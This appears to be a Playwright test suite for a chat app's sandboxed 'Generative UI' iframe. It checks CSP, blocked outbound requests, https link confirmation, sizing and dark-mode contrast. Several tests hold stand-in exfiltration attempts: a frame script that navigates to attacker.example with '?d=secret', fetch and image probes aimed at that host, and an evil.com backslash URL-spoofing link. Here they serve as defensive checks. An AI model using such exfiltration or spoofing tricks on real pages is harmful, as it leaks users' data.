import { expect, test, type BrowserContext, type Page } from "@playwright/test";

import { openChat, readCredentials, signIn, submit } from "./auth";

// These tests span several runs, a CDN load and first compiles under Next dev.
test.describe.configure({ timeout: 120_000 });

const UI_MODEL = "E2E Provider · e2e-ui-model";
// ADR-0004; kept as a literal here so that changing the policy means changing this test too.
const CSP =
  "default-src 'none'; script-src 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'unsafe-inline'; " +
  "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";

const sandbox = (page: Page) => page.frameLocator("iframe[sandbox]");

async function ask(page: Page, question: string, model?: string): Promise<string> {
  if (model) await page.getByLabel("Model").selectOption({ label: model });
  await page.getByRole("textbox").first().fill(question);
  return submit(page);
}

function countRuns(page: Page) {
  const runs: string[] = [];
  page.on("request", (request) => {
    if (request.method() === "POST" && request.url().endsWith("/agent/default/run")) runs.push(request.url());
  });
  return runs;
}

/**
 * Records whatever the browser sends to an attacker's address. It watches at the browser's network layer, because
 * Chromium refuses sandboxed frames' requests to loopback on its own, which would make a local server prove nothing.
 */
async function watchAttacker(context: BrowserContext) {
  const hits: string[] = [];
  const origin = "http://attacker.example";
  await context.route(`${origin}/**`, (route) => {
    const url = new URL(route.request().url());
    hits.push(url.pathname + url.search);
    return route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, body: "x" });
  });
  return { hits, origin };
}

test("a Generative UI shows a placeholder while it is written, works with no run, and reopens at its height with the CSP", async ({ page }) => {
  const { a } = readCredentials();
  await signIn(page, a);
  const chat = await page.goto("/chat");
  expect(chat!.headers()["content-security-policy"]).toBe("frame-src 'none'");
  await openChat(page);
  const runs = countRuns(page);

  // Sample inside the page: the text is on screen next to the placeholder, and no frame exists until the code is complete.
  const seen = page.evaluate(
    () =>
      new Promise<{ placeholder: boolean; textBesidePlaceholder: boolean }>((resolve) => {
        let placeholder = false;
        let textBesidePlaceholder = false;
        const timer = setInterval(() => {
          const body = document.body.textContent ?? "";
          if (document.querySelector("iframe[sandbox]")) {
            clearInterval(timer);
            resolve({ placeholder, textBesidePlaceholder });
          } else if ([...document.querySelectorAll("[role=status]")].some((e) => e.textContent?.includes("Building the Generative UI"))) {
            placeholder = true;
            textBesidePlaceholder ||= body.includes("Here is a slider.");
          }
        }, 5);
      }),
  );
  const threadId = await ask(page, "[gui] Show a slider", UI_MODEL);
  expect(await seen).toEqual({ placeholder: true, textBesidePlaceholder: true });

  // Controls respond locally.
  const frame = sandbox(page);
  await expect(frame.getByText("value: 10")).toBeVisible({ timeout: 30_000 });
  await frame.getByLabel("value").fill("73");
  await expect(frame.getByText("value: 73")).toBeVisible();
  await frame.getByRole("button", { name: "add 5" }).click();
  await expect(frame.getByText("value: 78")).toBeVisible();
  expect(runs).toHaveLength(1);

  // The height is measured: more than the 60px the Model asked for, and nothing clipped.
  const iframe = page.locator("iframe[sandbox]");
  await expect.poll(async () => (await iframe.boundingBox())!.height).toBeGreaterThan(100);
  const liveHeight = (await iframe.boundingBox())!.height;
  const content = await frame.locator("body").evaluate((body) => body.scrollHeight);
  expect(liveHeight).toBeGreaterThanOrEqual(content);
  expect(await frame.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content")).toBe(CSP);

  // Reopened: no agent run, the same height, the controls back at their first values, the same CSP and header.
  const reopened = await page.context().newPage();
  const calls: string[] = [];
  reopened.on("request", (request) => new URL(request.url()).pathname.startsWith("/api/copilotkit") && calls.push(request.url()));
  await reopened.addInitScript(() => {
    (window as unknown as { placeholderSeen: boolean }).placeholderSeen = false;
    setInterval(() => {
      // Not body text: the page also carries its translations as script text.
      if ([...document.querySelectorAll("[role=status]")].some((e) => e.textContent?.includes("Building the Generative UI"))) (window as unknown as { placeholderSeen: boolean }).placeholderSeen = true;
    }, 5);
  });
  const response = await reopened.goto(`/chat/${threadId}`);
  expect(response!.headers()["content-security-policy"]).toBe("frame-src 'none'");
  const stored = sandbox(reopened);
  await expect(stored.getByText("value: 10")).toBeVisible({ timeout: 30_000 });
  await expect(reopened.getByText("Here is a slider.")).toBeVisible();
  await expect.poll(async () => (await reopened.locator("iframe[sandbox]").boundingBox())!.height).toBeCloseTo(liveHeight, -1);
  expect(await stored.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content")).toBe(CSP);
  await stored.getByRole("button", { name: "add 5" }).click();
  await expect(stored.getByText("value: 15")).toBeVisible();
  expect(calls).toEqual([]);
  expect(await reopened.evaluate(() => (window as unknown as { placeholderSeen: boolean }).placeholderSeen)).toBe(false);
});

test("generated code cannot send anything out, and Chart.js still loads from jsDelivr", async ({ page }) => {
  const attacker = await watchAttacker(page.context());
  const { a } = readCredentials();
  await signIn(page, a);
  await openChat(page);
  const runs = countRuns(page);

  // The observer sees the browser when it does send: a request from the host page itself.
  await page.evaluate((origin) => fetch(`${origin}/control`, { mode: "no-cors" }), attacker.origin);
  await expect.poll(() => attacker.hits).toEqual(["/control"]);
  attacker.hits.length = 0;

  await ask(page, `[gui-probe ${attacker.origin}] probe`, UI_MODEL);
  const frame = sandbox(page);
  await expect(frame.locator("#r")).toContainText("loaded v4.4.4", { timeout: 30_000 });
  await expect(frame.locator("#r")).toContainText('"fetch":"blocked"');
  await expect(frame.locator("#r")).toContainText('"img":"blocked"');
  await expect(frame.locator("canvas")).toBeVisible();

  // The sandbox navigates its own frame away with the address in it; frame-src 'none' on the page stops that.
  await frame.locator("#r").click();
  await page.waitForTimeout(1500);
  expect(attacker.hits).toEqual([]);
  expect(runs).toHaveLength(1);
});

test("arriving in Chat by client-side navigation still blocks the frame navigation", async ({ page }) => {
  const attacker = await watchAttacker(page.context());
  const { a } = readCredentials();
  // The sign-in form soft-navigates to /chat: no document load, so only the sign-in page's own headers apply.
  await signIn(page, a);
  await ask(page, `[gui-probe ${attacker.origin}] probe`, UI_MODEL);
  const frame = sandbox(page);
  await expect(frame.locator("#r")).toContainText("loaded v4.4.4", { timeout: 30_000 });
  await frame.locator("#r").click();
  await page.waitForTimeout(1500);
  expect(attacker.hits).toEqual([]);
});

test("the sandbox's own CSP does not stop it navigating away; frame-src 'none' on the page does", async ({ page }) => {
  const attacker = await watchAttacker(page.context());
  // The same kind of frame as the sandbox, under the same CSP, on a page with the header and one without.
  const srcdoc = `<head><meta http-equiv="Content-Security-Policy" content="${CSP}"></head><body><script>location.href='${attacker.origin}/navigation?d=secret'</script>`;
  const html = `<iframe sandbox="allow-scripts " srcdoc="${srcdoc.replaceAll('"', "&quot;")}"></iframe>`;
  await page.route("**/frame-page/*", (route) =>
    route.fulfill({
      contentType: "text/html",
      body: html,
      headers: route.request().url().endsWith("/with") ? { "content-security-policy": "frame-src 'none'" } : {},
    }),
  );

  await page.goto("/frame-page/with");
  await page.waitForTimeout(1500);
  expect(attacker.hits).toEqual([]);

  await page.goto("/frame-page/without");
  await expect.poll(() => attacker.hits).toEqual(["/navigation?d=secret"]);
});

test("a Model without the flag answers in text, and a malformed Generative UI fails the Answer with a Retry", async ({ page }) => {
  const { a } = readCredentials();
  await signIn(page, a);
  await openChat(page);
  await ask(page, "[gui] Show a slider");
  await expect(page.getByText("The walking skeleton is working.")).toBeVisible({ timeout: 30_000 });
  await expect(page.locator("iframe")).toHaveCount(0);

  await page.getByRole("button", { name: "New conversation" }).click();
  await openChat(page);
  await ask(page, `[gui-bad] Break ${Date.now()}`, UI_MODEL);
  await expect(page.locator("p[role=alert]")).toContainText("The Model could not finish the Answer");
  await expect(page.locator("iframe")).toHaveCount(0);
  await expect(page.getByText("Building the Generative UI")).toHaveCount(0);

  await page.getByRole("button", { name: "Retry" }).click();
  await expect(sandbox(page).getByText("value: 10")).toBeVisible({ timeout: 30_000 });
});

test("links need an https address and a confirmation showing it, and generated code cannot ask a question", async ({ page }) => {
  const { a } = readCredentials();
  await signIn(page, a);
  await openChat(page);
  await page.context().route("https://example.com/**", (route) => route.fulfill({ body: "ok" }));
  const runs = countRuns(page);
  await ask(page, "[gui-links] links", UI_MODEL);
  const frame = sandbox(page);
  const result = frame.locator("#r");

  await frame.getByRole("button", { name: "send prompt" }).click();
  await expect(result).toContainText("prompt: absent", { timeout: 30_000 });
  await frame.getByRole("button", { name: "open http", exact: true }).click();
  await expect(result).toContainText("http: refused");
  await expect(page.getByRole("dialog")).toHaveCount(0);

  const popups: unknown[] = [];
  page.context().on("page", (popup) => popups.push(popup));
  await frame.getByRole("button", { name: "open https", exact: true }).click();
  await expect(page.getByRole("dialog")).toContainText("https://example.com/a?b=1");
  await page.getByRole("button", { name: "Cancel" }).click();
  await expect(result).toContainText('https: {"ok":false}');
  expect(popups).toHaveLength(0);

  const popup = page.context().waitForEvent("page");
  await frame.getByRole("button", { name: "open https", exact: true }).click();
  await page.getByRole("button", { name: "Open link" }).click();
  expect((await popup).url()).toBe("https://example.com/a?b=1");
  expect(runs).toHaveLength(1);
});

test("a second link cannot replace the one awaiting confirmation, and the shown address is the one that opens", async ({ page }) => {
  const { a } = readCredentials();
  await signIn(page, a);
  await openChat(page);
  await page.context().route(/https:\/\/(evil\.com|first\.example|second\.example)\/.*/, (route) => route.fulfill({ body: "ok" }));
  await ask(page, "[gui-links] links", UI_MODEL);
  const frame = sandbox(page);
  const result = frame.locator("#r");

  await frame.getByRole("button", { name: "swap" }).click();
  await expect(result).toContainText("second: refused", { timeout: 30_000 });
  await expect(page.getByRole("dialog")).toContainText("https://first.example/");
  await expect(page.getByRole("dialog")).not.toContainText("second.example");
  await page.getByRole("button", { name: "Cancel" }).click();
  await expect(result).toContainText('first: {"ok":false}');

  // WHATWG reads the backslash as a slash, so the host is evil.com, whatever follows.
  await frame.getByRole("button", { name: "evil" }).click();
  await expect(page.getByRole("dialog")).toContainText("https://evil.com/@good.com/");
  const popup = page.context().waitForEvent("page");
  await page.getByRole("button", { name: "Open link" }).click();
  expect((await popup).url()).toBe("https://evil.com/@good.com/");
});

test.describe("in dark mode", () => {
  test.use({ colorScheme: "dark" });

  test("the Generative UI text keeps 4.5:1 against its background", async ({ page }) => {
    const { a } = readCredentials();
    await signIn(page, a);
    await openChat(page);
    await ask(page, "[gui] Show a slider", UI_MODEL);
    const frame = sandbox(page);
    await expect(frame.getByText("value: 10")).toBeVisible({ timeout: 30_000 });

    // Resolve whatever colour syntax the browser reports to RGB through a canvas pixel.
    const [text, background] = await frame.locator("body").evaluate((body) => {
      const rgb = (color: string) => {
        const context = document.createElement("canvas").getContext("2d", { willReadFrequently: true })!;
        context.fillStyle = color;
        context.fillRect(0, 0, 1, 1);
        return Array.from(context.getImageData(0, 0, 1, 1).data.slice(0, 3));
      };
      const style = getComputedStyle(body);
      return [rgb(style.color), rgb(style.backgroundColor)];
    });
    const luminance = (c: number[]) => {
      const [r, g, b] = c.map((v) => ((v /= 255) <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4));
      return 0.2126 * r + 0.7152 * g + 0.0722 * b;
    };
    const [light, dark] = [luminance(text), luminance(background)].sort((x, y) => y - x);
    expect((light + 0.05) / (dark + 0.05)).toBeGreaterThanOrEqual(4.5);
    expect(luminance(text)).toBeGreaterThan(luminance(background));
  });
});

test("stopping while the interface is written clears the placeholder, and reopening runs no partial code", async ({ page }) => {
  const { a } = readCredentials();
  await signIn(page, a);
  await openChat(page);
  const threadId = await ask(page, `[gui-stall] Stop me ${Date.now()}`, UI_MODEL);
  await expect(page.getByText("Building the Generative UI")).toBeVisible({ timeout: 30_000 });

  await page.getByRole("button", { name: "Stop" }).click();
  await expect(page.getByRole("status").filter({ hasText: "Stopped" })).toBeVisible();
  await expect(page.getByText("Building the Generative UI")).toHaveCount(0);
  await expect(page.locator("iframe")).toHaveCount(0);

  await page.goto(`/chat/${threadId}`);
  await expect(page.getByText("Started writing.")).toBeVisible();
  await expect(page.getByText("Building the Generative UI")).toHaveCount(0);
  await expect(page.locator("iframe")).toHaveCount(0);
});
